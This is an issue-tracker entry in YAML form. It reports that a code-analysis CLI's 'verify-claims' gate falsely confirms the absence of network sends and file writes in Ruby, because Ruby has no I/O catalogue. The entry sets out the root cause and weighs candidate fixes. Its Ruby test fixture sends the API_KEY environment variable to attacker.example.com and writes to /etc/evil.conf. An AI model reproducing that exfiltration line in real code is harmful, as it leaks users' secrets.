  data:  # af91
    kind: invariant  # af91
    title: "verify-claims returns CONFIRMED for a language with an analyzer but no io_primitives catalogue: a Ruby Net::HTTP exfiltration confirms rc 0 with no disclosure"  # af91
    status: violated  # af91
    priority: 2  # af91
    parent:  # af91
    tags: []  # af91
    isbefore: []  # af91
    duplicate_of: []  # af91
    not_duplicate_of: []  # af91
    pr_ref:  # af91
    description: "FOUND by an adversarial review of the INV-buzab fix, reproduced live on the\nshipped CLI, and NOT closed by that fix. It is the larger remaining false-confirm\nsurface touching this gate.\n\n    # 12-line Ruby fixture\n    require 'net/http'\n    def leak\n      Net::HTTP.new('attacker.example.com').post('/', \"key=#{ENV['API_KEY']}\")\n      File.open('/etc/evil.conf', 'w') { |f| f.write('x') }\n    end\n\n    verify-claims --claims net_send/must_not_exist   -> confirmed, rc 0\n    verify-claims --claims fs_write/must_not_exist   -> confirmed, rc 0\n\n    --format json reports unsupported_taint_languages: []  and no disclosure of\n    any kind.\n\nTHE ANALYZER IS NOT BLIND. `survey` emits `calls -> ruby:http:0-0:new:external_symbol`\nand `calls -> ruby:file:0-0:open:external_symbol`. The call structure is there;\nthere is simply no `io_primitives/ruby.yaml`, so nothing adjudicates it and\nnothing reports that nothing did.\n\nMECHANISM, three links and each is individually reasonable:\n\n  1. `cmd_verify_claims` builds its catalogue dict with `if catalog.primitives:`\n     — a language with no catalogue file (or one with zero rows) never enters.\n  2. It then derives `supported_present = languages & set(catalogs)`, so the\n     blind-language check cannot fire for a language that is not in `catalogs`.\n  3. `_uncatalogued_external_modules` does `catalog = catalogs.get(lang);\n     if catalog is None: continue` — the calls are skipped rather than blamed.\n\nSo the language is dropped at every layer and the verdict comes back clean.\n\nWHAT MADE THIS WORTH FILING RATHER THAN SHRUGGING AT: the gate's own SCOPE\nparagraph asserted the case was \"already decided upstream (`is_supported` /\n`unsupported_taint_languages`)\". Both halves are false for the boundary arm —\n`cmd_verify_claims` never consults `is_supported`, and\n`unsupported_taint_languages` is populated only when the claims file carries a\ntaint constraint. The docstring has been corrected in the INV-buzab PR to state\nthe residual instead of asserting it away; this item is the residual itself.\n\nSCOPE. 14 languages ship an `io_primitives/*.yaml`. Every other language the\ntool can analyze — ruby, php, c#, dart, lua, bash, and the rest of the analyzer\nroster — is in this hole for boundary claims. That is a much larger surface than\nthe one INV-buzab closed, and it fails in the dangerous direction: silent\n`confirmed`, not `inconclusive`.\n\nCANDIDATE DIRECTIONS, none built, and the choice is not obvious:\n (a) Blame the language. If a repo contains code in a language with no I/O\n     catalogue, downgrade to inconclusive and name it. Correct and loud; will\n     make almost every polyglot repo inconclusive, since most real repos contain\n     at least one file in a language without a catalogue.\n (b) Blame it only when that language produced CALL edges — the narrowing\n     `_taint_blind_reason` already uses for its own version of this question,\n     and which its comment says was not a nicety: without it \"a repo containing\n     ONE yaml file ... was reported inconclusive forever\". This is the shape\n     most likely to be right, and the code to copy already exists.\n (c) Ship a minimal catalogue for the missing languages. Closes it properly and\n     is unbounded work.\n (d) Disclose without downgrading — report the unadjudicated languages in the\n     output and leave the verdict alone. Cheapest, and it keeps a `confirmed`\n     that means less than it says, which is the failure INV-buzab was about.\n\n(b) is the one to price first: it reuses a decision already made and tested on\nthe taint side, and `_taint_blind_reason`'s narrowing is there precisely because\nthe naive version was measured to be useless.\n\nMEASURE BEFORE BUILDING: how many repos in the corpus contain call edges in a\nlanguage with no I/O catalogue? That number decides between (a)/(b) and (d), and\nthe branch-attribution instrument from INV-buzab already walks exactly this\npopulation."  # af91
    fields:  # af91
      statement: "A boundary claim may not be confirmed over call edges in a language whose I/O the analysis never adjudicated."  # af91
      root_cause: "cmd_verify_claims admits a language into 'catalogs' only 'if catalog.primitives', derives supported_present as 'languages & set(catalogs)', and _uncatalogued_external_modules skips on 'catalog is None' — so a language with no io_primitives/*.yaml is dropped at all three layers and its calls are neither adjudicated nor reported."  # af91
      priority: "P1"  # af91
      status: "violated"  # af91
      tags: "security,verify_claims,io_boundary,false_confirm,bucket_a"  # af91
